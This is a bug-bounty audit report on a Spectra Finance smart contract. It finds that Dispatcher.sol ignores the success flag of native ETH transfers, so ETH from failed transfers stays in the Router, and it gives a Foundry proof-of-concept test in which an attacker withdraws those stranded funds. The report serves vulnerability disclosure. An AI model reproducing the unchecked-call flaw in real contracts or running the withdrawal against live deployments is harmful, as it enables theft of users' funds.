# #44170 \[SC-Low] Missing Check for Native ETH Transfer Success Allows Silent Failures and Potential Theft of Funds

**Submitted on Apr 17th 2025 at 13:29:07 UTC by @Oxblackadam for** [**Audit Comp | Spectra Finance**](https://immunefi.com/audit-competition/audit-comp-spectra-finance)

* **Report ID:** #44170
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/Spectra-Audit-Competition/blob/main/src/router/Dispatcher.sol>
* **Impacts:**
  * Theft of failed transfer in the contract.
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The `Dispatcher.sol` contract, which serves as a base for `Router.sol`, executes native ETH transfers using a low-level .call but omits a crucial check to verify if the transfer was successful. Consequently, if a native ETH transfer fails during the execution of a command sequence via the Router (e.g., due to the recipient rejecting ETH), the transaction will not revert. This silent failure leaves the ETH intended for the transfer within the Router contract. Since any user can call the execute function and specify a TRANSFER\_NATIVE command targeting themselves, an attacker can subsequently withdraw this "stuck" ETH, leading to a direct loss of funds for the user whose initial transfer failed

## Vulnerability Details

The `_dispatch` function within `Dispatcher.sol` is responsible for executing various commands based on the \_commandType input. When the command is `Commands.TRANSFER_NATIVE`, the contract attempts to send native ETH using the low-level .call{value: amount}("") method.

File: src/router/Dispatcher.sol

```solidity
    } else if (command == Commands.TRANSFER_NATIVE) {
        (address recipient, uint256 amount) = abi.decode(_inputs, (address, uint256));
        // Low-level call to transfer ETH
        (bool success, ) = payable(recipient).call{value: amount}(""); 
// <<< VULNERABILITY: 'success' is not checked

    } else if // ... other commands ...
```

The .call function returns a boolean success flag indicating whether the call executed successfully (without reverting). However, the code does not check this success flag.

The `Router.sol` contract inherits `Dispatcher.sol` and uses the `_dispatch` function within its execute methods to process sequences of commands:

File: src/router/Router.sol

```solidity
    function execute(
        bytes calldata _commands,
        bytes[] calldata _inputs
    ) public payable override whenNotPaused {
        // ... setup ...
        uint256 numCommands = _commands.length;
        // ... length check ...

        // ... msgSender/msgValue tracking ...

        for (uint256 commandIndex; commandIndex < numCommands; ) {
            bytes1 command = _commands[commandIndex];
            bytes calldata input = _inputs[commandIndex];

            _dispatch(command, input); // <<< Calls Dispatcher._dispatch

            // Execution proceeds even if _dispatch had a silent failure
            unchecked {
                commandIndex++;
            }
        }

        // ... cleanup ...
    }
```

If the .call{value: amount}("") within the TRANSFER\_NATIVE command handling fails (e.g., the recipient contract rejects ETH, the recipient runs out of gas), success will be false. Since `Dispatcher.sol` doesn't check this and doesn't revert, control returns normally to Router.sol. The execute function in Router.sol then proceeds to the next command in the sequence, unaware that the intended ETH transfer failed. The ETH remains in the Router contract's balance.

## Impact Details

* Theft of Funds: This is the most critical impact. If a user's transaction involving TRANSFER\_NATIVE fails silently, the ETH remains in the Router. An attacker can then call Router.execute with a TRANSFER\_NATIVE command specifying their own address as the recipient and the amount of ETH left in the contract. Since there are no checks preventing this, the attacker can successfully withdraw the ETH belonging to the original user. This leads to a direct loss of funds for the user whose transaction initially failed.
* State Inconsistency: Subsequent commands within the original user's execute transaction might rely on the native ETH transfer having occurred. Since the transaction doesn't revert on failure, these later commands will operate under the false assumption that the transfer succeeded, leading to unpredictable behavior and potentially corrupted final states for that specific transaction.
* Broken Logic Flows: Complex interactions involving multiple steps, where one step is a native ETH transfer, can break silently for the original user, potentially causing their overall desired outcome to fail even if the transaction doesn't revert immediately.

## References

<https://github.com/immunefi-team/Spectra-Audit-Competition/blob/1cebdc67a9276fd87105d13f302fd77d000d0c0b/src/router/Dispatcher.sol#L485>

## Proof of Concept

## Proof of Concept

ADD THIS TEST TO THE test/Router/RouterTest.t.sol function testTransferBug() public { address alice = makeAddr("Alice"); address attacker = makeAddr("atacker"); uint256 amount = 2e18;

```
    RejectEther fundsRejecter = new RejectEther();

    deal(alice, amount);
    bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.TRANSFER_NATIVE)));
    bytes[] memory inputs = new bytes[](1);
    inputs[0] = abi.encode(address(fundsRejecter), amount);

    uint256 aliceBalanceBefore = alice.balance;
    uint256 attackerBalanceBefore = attacker.balance;
    uint256 fundsRejecterBalance = address(fundsRejecter).balance;
    uint256 routerBalance = address(router).balance;

    console.log("Alice Balance Before", aliceBalanceBefore);
    console.log("Attacker Balance Before", attackerBalanceBefore);
    console.log("fundsRejecterBalance Balance Before", fundsRejecterBalance);
    console.log("Router Balance Before", routerBalance);

    //alsice calls router for transfer
    vm.prank(alice);
    router.execute{value:amount}(commands, inputs);


    console.log("Alice Balance After", alice.balance);
    console.log("Attacker Balance After", attacker.balance);
    console.log("fundsRejecterBalance Balance After", address(fundsRejecter).balance);
    console.log("Router Balance After", address(router).balance);

    //attacker sees the funds annd calls the router to transfer the funds to him
    inputs[0] = abi.encode(attacker, amount);

    vm.prank(attacker);
    router.execute(commands, inputs);

    console.log("Alice Balance After attack", alice.balance);
    console.log("Attacker Balance After attack", attacker.balance);
    console.log("fundsRejecterBalance Balance After attack", address(fundsRejecter).balance);
    console.log("Router Balance After attack", address(router).balance);
    
}
```

}

contract RejectEther { receive() external payable { revert("Ether transfer explicitly rejected"); } }
